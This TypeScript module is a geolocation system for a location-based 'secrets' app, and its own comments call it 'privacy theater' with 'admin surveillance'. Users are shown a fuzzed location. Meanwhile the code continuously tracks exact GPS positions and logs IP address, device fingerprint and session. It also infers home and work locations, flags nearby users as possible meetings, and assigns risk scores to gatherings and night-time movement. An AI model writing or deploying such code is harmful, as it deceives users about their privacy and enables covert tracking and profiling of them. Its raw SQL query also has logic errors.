// Geolocation System with Privacy Theater and Admin Surveillance
// Users see fuzzed city-level data, admins get exact coordinates

import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

export interface LocationData {
  latitude: number;
  longitude: number;
  accuracy?: number;
  altitude?: number;
  speed?: number;
  heading?: number;
  timestamp: Date;
}

export interface FuzzedLocation {
  city: string;
  region: string;
  country: string;
  latitude: number; // Fuzzed to city center
  longitude: number; // Fuzzed to city center
}

export interface AdminLocationData extends LocationData {
  userId: string;
  sessionId?: string;
  deviceInfo?: any;
  ipAddress?: string;
  geohash: string;
  locationAnalysis: {
    isHome?: boolean;
    isWork?: boolean;
    isFrequentLocation?: boolean;
    riskLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
    nearbyUsers?: string[];
    geofenceAlerts?: string[];
  };
}

// Browser Geolocation with High Accuracy
export async function requestLocationPermission(): Promise<boolean> {
  if (!navigator.geolocation) {
    throw new Error('Geolocation is not supported by this browser');
  }

  try {
    const permission = await navigator.permissions.query({ name: 'geolocation' });
    return permission.state === 'granted' || permission.state === 'prompt';
  } catch (error) {
    // Fallback for older browsers
    return true;
  }
}

export async function getCurrentLocation(highAccuracy: boolean = true): Promise<LocationData> {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation is not supported'));
      return;
    }

    const options: PositionOptions = {
      enableHighAccuracy: highAccuracy,
      timeout: 15000,
      maximumAge: 60000 // Cache for 1 minute
    };

    navigator.geolocation.getCurrentPosition(
      (position) => {
        resolve({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude || undefined,
          speed: position.coords.speed || undefined,
          heading: position.coords.heading || undefined,
          timestamp: new Date(position.timestamp)
        });
      },
      (error) => {
        let message = 'Unknown geolocation error';
        switch (error.code) {
          case error.PERMISSION_DENIED:
            message = 'Location access denied by user';
            break;
          case error.POSITION_UNAVAILABLE:
            message = 'Location information unavailable';
            break;
          case error.TIMEOUT:
            message = 'Location request timed out';
            break;
        }
        reject(new Error(message));
      },
      options
    );
  });
}

// Continuous Location Tracking for Admin Surveillance
export function startLocationTracking(
  userId: string,
  callback: (location: LocationData) => void,
  interval: number = 30000 // 30 seconds
): number | null {
  if (!navigator.geolocation) {
    return null;
  }

  const options: PositionOptions = {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 5000
  };

  return navigator.geolocation.watchPosition(
    (position) => {
      const location: LocationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude || undefined,
        speed: position.coords.speed || undefined,
        heading: position.coords.heading || undefined,
        timestamp: new Date(position.timestamp)
      };

      callback(location);

      // Store in admin surveillance system
      storeLocationForSurveillance(userId, location);
    },
    (error) => {
      console.error('Location tracking error:', error);
    },
    options
  );
}

// Store Exact Location for Admin (Privacy Theater)
async function storeLocationForSurveillance(userId: string, location: LocationData) {
  try {
    const geohash = generateGeohash(location.latitude, location.longitude);
    const locationAnalysis = await analyzeLocationContext(userId, location);

    await prisma.locationHistory.create({
      data: {
        userId,
        latitude: location.latitude,
        longitude: location.longitude,
        accuracy: location.accuracy,
        altitude: location.altitude,
        speed: location.speed,
        heading: location.heading,
        timestamp: location.timestamp,
        geohash,
        surveillanceType: 'PASSIVE',
        sessionId: getCurrentSessionId(),
        deviceInfo: getDeviceInfo(),
        ipAddress: await getUserIP()
      }
    });

    // Check for geofence alerts
    await checkGeofenceAlerts(userId, location);

  } catch (error) {
    console.error('Failed to store location for surveillance:', error);
  }
}

// Fuzz Location for User Privacy Theater
export function fuzzLocationForUser(latitude: number, longitude: number): FuzzedLocation {
  // Add random offset up to ~5km for privacy theater
  const latOffset = (Math.random() - 0.5) * 0.09; // ~5km in latitude
  const lonOffset = (Math.random() - 0.5) * 0.09; // ~5km in longitude
  
  const fuzzedLat = latitude + latOffset;
  const fuzzedLon = longitude + lonOffset;

  // Get city information (this would typically use a reverse geocoding service)
  const cityInfo = getCityFromCoordinates(latitude, longitude);

  return {
    city: cityInfo.city,
    region: cityInfo.region,
    country: cityInfo.country,
    latitude: fuzzedLat,
    longitude: fuzzedLon
  };
}

// Distance Calculation (Haversine Formula)
export function calculateDistance(
  lat1: number,
  lon1: number,
  lat2: number,
  lon2: number
): number {
  const R = 6371e3; // Earth's radius in meters
  const φ1 = (lat1 * Math.PI) / 180;
  const φ2 = (lat2 * Math.PI) / 180;
  const Δφ = ((lat2 - lat1) * Math.PI) / 180;
  const Δλ = ((lon2 - lon1) * Math.PI) / 180;

  const a =
    Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
    Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));

  return R * c; // Distance in meters
}

// Generate Geohash for Efficient Spatial Queries
export function generateGeohash(latitude: number, longitude: number, precision: number = 9): string {
  const base32 = '0123456789bcdefghjkmnpqrstuvwxyz';
  let lat = latitude;
  let lon = longitude;
  let latRange = [-90, 90];
  let lonRange = [-180, 180];
  let isEven = true;
  let bit = 0;
  let geohash = '';
  let ch = 0;

  while (geohash.length < precision) {
    if (isEven) {
      const mid = (lonRange[0] + lonRange[1]) / 2;
      if (lon >= mid) {
        ch |= 1 << (4 - bit);
        lonRange[0] = mid;
      } else {
        lonRange[1] = mid;
      }
    } else {
      const mid = (latRange[0] + latRange[1]) / 2;
      if (lat >= mid) {
        ch |= 1 << (4 - bit);
        latRange[0] = mid;
      } else {
        latRange[1] = mid;
      }
    }

    isEven = !isEven;
    bit++;

    if (bit === 5) {
      geohash += base32[ch];
      bit = 0;
      ch = 0;
    }
  }

  return geohash;
}

// Find Nearby Secrets within Radius
export async function findNearbySecrets(
  userLatitude: number,
  userLongitude: number,
  radius: number = 10000 // 10km default
): Promise<any[]> {
  try {
    // Use raw SQL for efficient geospatial query
    const secrets = await prisma.$queryRaw`
      SELECT 
        id,
        content,
        category,
        fuzzy_latitude as latitude,
        fuzzy_longitude as longitude,
        city,
        region,
        mask_name,
        discovery_count,
        created_at,
        (
          6371000 * acos(
            cos(radians(${userLatitude})) * 
            cos(radians(latitude)) * 
            cos(radians(longitude) - radians(${userLongitude})) + 
            sin(radians(${userLatitude})) * 
            sin(radians(latitude))
          )
        ) AS distance
      FROM drop_secrets 
      WHERE is_active = true
      AND expires_at IS NULL OR expires_at > NOW()
      HAVING distance <= ${radius}
      ORDER BY distance
      LIMIT 50
    `;

    return secrets as any[];
  } catch (error) {
    console.error('Error finding nearby secrets:', error);
    return [];
  }
}

// Verify Location for Secret Unlock
export async function verifyLocationForUnlock(
  secretId: string,
  userLatitude: number,
  userLongitude: number,
  isAdmin: boolean = false
): Promise<{ canUnlock: boolean; distance: number; message: string }> {
  try {
    const secret = await prisma.dropSecret.findUnique({
      where: { id: secretId }
    });

    if (!secret) {
      return { canUnlock: false, distance: 0, message: 'Secret not found' };
    }

    // Admin override - can unlock from anywhere
    if (isAdmin) {
      return { canUnlock: true, distance: 0, message: 'Admin override access' };
    }

    const distance = calculateDistance(
      userLatitude,
      userLongitude,
      secret.latitude,
      secret.longitude
    );

    const canUnlock = distance <= secret.unlockRadius;
    const message = canUnlock 
      ? 'You are close enough to unlock this secret'
      : `You need to be within ${secret.unlockRadius}m to unlock (currently ${Math.round(distance)}m away)`;

    return { canUnlock, distance, message };
  } catch (error) {
    console.error('Error verifying location for unlock:', error);
    return { canUnlock: false, distance: 0, message: 'Location verification failed' };
  }
}

// Admin Location Analytics
async function analyzeLocationContext(userId: string, location: LocationData) {
  try {
    // Get user's location history for pattern analysis
    const recentLocations = await prisma.locationHistory.findMany({
      where: {
        userId,
        timestamp: {
          gte: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) // Last 30 days
        }
      },
      orderBy: { timestamp: 'desc' },
      take: 1000
    });

    // Analyze if this is a frequent location
    const nearbyLocations = recentLocations.filter(loc => 
      calculateDistance(location.latitude, location.longitude, loc.latitude, loc.longitude) < 500
    );

    const isFrequentLocation = nearbyLocations.length > 10;
    
    // Check for nearby users (potential meetings)
    const nearbyUsers = await findNearbyUsers(location.latitude, location.longitude, 100); // 100m radius

    // Assess risk level based on location patterns
    const riskLevel = assessLocationRisk(location, recentLocations, nearbyUsers);

    return {
      isFrequentLocation,
      riskLevel,
      nearbyUsers: nearbyUsers.map(u => u.userId),
      locationCategory: categorizeLocation(location, recentLocations)
    };
  } catch (error) {
    console.error('Error analyzing location context:', error);
    return { riskLevel: 'LOW' as const };
  }
}

// Check Geofence Alerts
async function checkGeofenceAlerts(userId: string, location: LocationData) {
  try {
    const activeGeofences = await prisma.geofence.findMany({
      where: { isActive: true }
    });

    for (const geofence of activeGeofences) {
      const distance = calculateDistance(
        location.latitude,
        location.longitude,
        geofence.centerLatitude,
        geofence.centerLongitude
      );

      const isInside = distance <= geofence.radius;
      
      // Check if user was previously inside/outside
      const lastAlert = await prisma.geofenceAlert.findFirst({
        where: { userId, geofenceId: geofence.id },
        orderBy: { triggeredAt: 'desc' }
      });

      const shouldAlert = 
        (geofence.alertType === 'ENTRY' && isInside) ||
        (geofence.alertType === 'EXIT' && !isInside) ||
        (geofence.alertType === 'BOTH');

      if (shouldAlert && (!lastAlert || Date.now() - lastAlert.triggeredAt.getTime() > 300000)) { // 5 min cooldown
        await prisma.geofenceAlert.create({
          data: {
            userId,
            geofenceId: geofence.id,
            alertType: isInside ? 'ENTRY' : 'EXIT',
            latitude: location.latitude,
            longitude: location.longitude,
            severity: geofence.surveillanceLevel
          }
        });
      }
    }
  } catch (error) {
    console.error('Error checking geofence alerts:', error);
  }
}

// Helper Functions
function getCityFromCoordinates(latitude: number, longitude: number) {
  // This would typically use a reverse geocoding service
  // For now, return generic data
  return {
    city: 'Unknown City',
    region: 'Unknown Region',
    country: 'Unknown Country'
  };
}

function getCurrentSessionId(): string | undefined {
  return localStorage.getItem('sessionId') || undefined;
}

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth
    }
  };
}

async function getUserIP(): Promise<string | undefined> {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return undefined;
  }
}

async function findNearbyUsers(latitude: number, longitude: number, radius: number) {
  try {
    return await prisma.locationHistory.findMany({
      where: {
        timestamp: {
          gte: new Date(Date.now() - 10 * 60 * 1000) // Last 10 minutes
        }
      },
      select: {
        userId: true,
        latitude: true,
        longitude: true,
        timestamp: true
      }
    }).then(locations => 
      locations.filter(loc => 
        calculateDistance(latitude, longitude, loc.latitude, loc.longitude) <= radius
      )
    );
  } catch (error) {
    return [];
  }
}

function assessLocationRisk(
  location: LocationData, 
  history: any[], 
  nearbyUsers: any[]
): 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' {
  let riskScore = 0;

  // High movement speed might indicate vehicle travel
  if (location.speed && location.speed > 50) riskScore += 1;

  // Many nearby users might indicate gathering
  if (nearbyUsers.length > 5) riskScore += 2;

  // Unusual time patterns
  const hour = new Date().getHours();
  if (hour < 6 || hour > 22) riskScore += 1;

  // Infrequent location
  const isNewLocation = history.every(loc => 
    calculateDistance(location.latitude, location.longitude, loc.latitude, loc.longitude) > 1000
  );
  if (isNewLocation) riskScore += 1;

  if (riskScore >= 4) return 'CRITICAL';
  if (riskScore >= 3) return 'HIGH';
  if (riskScore >= 2) return 'MEDIUM';
  return 'LOW';
}

function categorizeLocation(location: LocationData, history: any[]): string {
  // Simple location categorization based on patterns
  // This would be enhanced with proper geofencing and POI data
  const frequentNearby = history.filter(loc => 
    calculateDistance(location.latitude, location.longitude, loc.latitude, loc.longitude) < 200
  );

  if (frequentNearby.length > 50) return 'HOME';
  if (frequentNearby.length > 20) return 'WORK';
  if (frequentNearby.length > 5) return 'FREQUENT';
  return 'OCCASIONAL';
}

// Export Admin Location Data (Full Precision)
export async function getAdminLocationData(userId: string): Promise<AdminLocationData[]> {
  try {
    const locations = await prisma.locationHistory.findMany({
      where: { userId },
      orderBy: { timestamp: 'desc' },
      take: 1000
    });

    return locations.map(loc => ({
      latitude: loc.latitude,
      longitude: loc.longitude,
      accuracy: loc.accuracy || undefined,
      altitude: loc.altitude || undefined,
      speed: loc.speed || undefined,
      heading: loc.heading || undefined,
      timestamp: loc.timestamp,
      userId: loc.userId,
      sessionId: loc.sessionId || undefined,
      deviceInfo: loc.deviceInfo,
      ipAddress: loc.ipAddress || undefined,
      geohash: loc.geohash || '',
      locationAnalysis: {
        riskLevel: 'LOW' // Would be computed from stored data
      }
    }));
  } catch (error) {
    console.error('Error getting admin location data:', error);
    return [];
  }
}
